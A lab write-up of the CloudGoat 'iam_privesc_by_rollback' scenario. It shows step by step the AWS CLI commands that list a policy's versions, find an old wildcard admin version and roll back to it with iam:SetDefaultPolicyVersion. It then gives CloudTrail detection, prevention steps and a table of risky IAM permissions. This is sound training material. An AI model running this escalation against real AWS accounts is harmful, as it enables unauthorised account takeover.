# CloudGoat — iam_privesc_by_rollback

> **Platform:** CloudGoat (Rhino Security Labs)  
> **Scenario:** iam_privesc_by_rollback  
> **Category:** AWS IAM Privilege Escalation  
> **Concepts:** IAM Policy Versioning · Policy Rollback · Privilege Escalation · `iam:SetDefaultPolicyVersion`  

---

## Scenario Overview

The `iam_privesc_by_rollback` scenario provisions a low-privilege IAM user (`raynor`) who has one unusual permission: `iam:SetDefaultPolicyVersion`. This single permission — normally considered low-risk — allows the user to switch the active version of an IAM policy. If an older version of an attached policy had broader permissions, the user can roll back to it and instantly escalate their own privileges to admin.

---

## Setup

```bash
cloudgoat create iam_privesc_by_rollback
# Profile configured: cloudgoat-practice
# Starting user:     raynor-cgid2nw42r00tv
# Target policy:     cg-raynor-policy-cgid2nw42r00tv
# Policy ARN:        arn:aws:iam::131328613086:policy/cg-raynor-policy-cgid2nw42r00tv
```

---

## Step 1 — Establish Identity

```bash
aws sts get-caller-identity --profile cloudgoat-practice
```

```json
{
  "UserId":  "AIDAR5E6LTLP0UZJA6BWV",
  "Account": "131328613086",
  "Arn":     "arn:aws:iam::131328613086:user/raynor-cgid2nw42r00tv"
}
```

Starting user is `raynor`. Account ID `131328613086` noted for ARN construction.

---

## Step 2 — Enumerate Users and Policies

```bash
aws iam list-users --profile cloudgoat-practice
```

Two users found: `cloudgoat-admin` and `raynor-cgid2nw42r00tv`.

```bash
aws iam list-policies --profile cloudgoat-practice
```

Three policies visible:

| Policy | Notes |
|--------|-------|
| `cg-raynor-policy-cgid2nw42r00tv` | Custom policy attached to raynor |
| `AdministratorAccess` | AWS managed — full admin |
| `PowerUserAccess` | AWS managed — near-full access |

![list-users and list-policies output](./Images/page-6.jpg)

The presence of `AdministratorAccess` in the account is noted — if raynor can attach it to himself that would be game over, but that requires `iam:AttachUserPolicy`. The interesting target is `cg-raynor-policy` — raynor's own attached policy.

---

## Step 3 — List All Versions of Raynor's Policy

IAM customer-managed policies support up to 5 simultaneous versions. Only one is the `default` — the one actually in effect. All others exist as historical snapshots.

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::131328613086:policy/cg-raynor-policy-cgid2nw42r00tv \
  --profile cloudgoat-practice
```

```json
{
  "Versions": [
    { "VersionId": "v5", "IsDefaultVersion": false, "CreateDate": "2026-08-16T17:08:27" },
    { "VersionId": "v4", "IsDefaultVersion": false, "CreateDate": "2026-08-16T17:08:25" },
    { "VersionId": "v3", "IsDefaultVersion": false, "CreateDate": "2026-08-16T17:08:24" },
    { "VersionId": "v2", "IsDefaultVersion": false, "CreateDate": "2026-08-16T17:08:22" },
    { "VersionId": "v1", "IsDefaultVersion": true,  "CreateDate": "2026-08-16T17:08:18" }
  ]
}
```

`v1` is the current default. Versions `v2` through `v5` are non-active snapshots. Each needs to be inspected — one of them likely grants far more than the current version.

![list-policy-versions showing 5 versions, v1 as default](./Images/page-7.jpg)

---

## Step 4 — Read Each Non-Default Version

Checking each version for its permission scope:

```bash
# Check v3 (check all versions until you find the dangerous one)
aws iam get-policy-version \
  --policy-arn arn:aws:iam::131328613086:policy/cg-raynor-policy-cgid2nw42r00tv \
  --version-id v3 \
  --profile cloudgoat-practice
```

```json
{
  "Statement": [{
    "Action":   "*",
    "Effect":   "Allow",
    "Resource": "*"
  }]
}
```

**Version 3 grants `Action: *` on `Resource: *` — full administrator access.**

This is a wildcard policy. Any principal operating under this version can do anything in the AWS account. It was replaced by a more restrictive version but never deleted.

![get-policy-version v3 showing Action * Resource *](./Images/page-8.jpg)

---

## Step 5 — Roll Back to the Admin Version

The current user has `iam:SetDefaultPolicyVersion` permission (this is what makes the privilege escalation possible). Use it to make `v3` the active default:

```bash
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::131328613086:policy/cg-raynor-policy-cgid2nw42r00tv \
  --version-id v3 \
  --profile cloudgoat-practice
```

No output on success — the command is silent when it works.

---

## Step 6 — Verify the Escalation

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::131328613086:policy/cg-raynor-policy-cgid2nw42r00tv \
  --profile cloudgoat-practice
```

```json
{ "VersionId": "v3", "IsDefaultVersion": true }
```

`v3` is now the default. Raynor's effective permissions have changed from restricted to `Action: * / Resource: *` — full administrator access — without touching any user or role directly, without attaching any new policy, and without triggering most standard privilege escalation detections.

![list-policy-versions confirming v3 is now default](./Images/page-8.jpg)

---

## Attack Chain Summary

```
raynor has iam:SetDefaultPolicyVersion on his own policy
        ↓
list-policy-versions → 5 versions exist, only v1 is active
        ↓
get-policy-version on each non-default version
        ↓
v3 found: Action *, Resource * (full admin)
        ↓
set-default-policy-version → v3 becomes active
        ↓
Raynor is now Administrator
```

---

## Why This Privilege Escalation Works

### IAM Policy Versioning — How It Works

When you update a customer-managed IAM policy, AWS does not overwrite the existing version. It creates a new version and sets it as the default. Up to 5 versions can exist simultaneously. Old versions are retained unless explicitly deleted.

```
v1  →  original policy (restrictive)  ← currently default
v2  →  updated policy
v3  →  accidentally broad policy (Action: *)
v4  →  fixed policy
v5  →  current policy (restrictive)   ← should be default
```

The default is what is enforced. Everything else is stored but dormant — until someone with `iam:SetDefaultPolicyVersion` wakes it up.

### Why `iam:SetDefaultPolicyVersion` is a Privilege Escalation Vector

This permission appears in security checklists as a privilege escalation risk, but it is often overlooked because:

1. It does not create any new resource
2. It does not modify policy content
3. It does not attach or detach policies
4. Standard GuardDuty detections focus on `CreatePolicyVersion`, `AttachUserPolicy`, `CreateAccessKey`

Yet with one API call, a user can switch from no permissions to full administrator — if a permissive old version exists.

---

## Detection and Defense

**How to detect this attack:**

CloudTrail event to monitor:
```
eventName: SetDefaultPolicyVersion
requestParameters.policyArn: <your policy ARNs>
```

Any call to `SetDefaultPolicyVersion` on a customer-managed policy should be investigated, especially if it is not part of a known deployment pipeline.

**How to prevent this:**

- Never grant `iam:SetDefaultPolicyVersion` to non-admin principals
- Delete stale policy versions — after updating a policy, delete the old version immediately:

```bash
aws iam delete-policy-version \
  --policy-arn <policy-arn> \
  --version-id <old-version-id>
```

- Use AWS IAM Access Analyzer to detect overly permissive versions before they become exploitable
- Audit all customer-managed policies regularly for non-default versions with broad permissions

---

## Key IAM Privilege Escalation Permissions to Monitor

| Permission | Why it's dangerous |
|------------|-------------------|
| `iam:SetDefaultPolicyVersion` | Roll back to a permissive old version |
| `iam:CreatePolicyVersion` | Create a new admin version of an attached policy |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to yourself |
| `iam:PutUserPolicy` | Create an inline policy granting admin |
| `iam:CreateAccessKey` | Create credentials for another user |
| `sts:AssumeRole` on admin roles | Assume a role with higher privileges |

---

*Writeup by Shrikrishna Hegde · CloudGoat — iam_privesc_by_rollback*
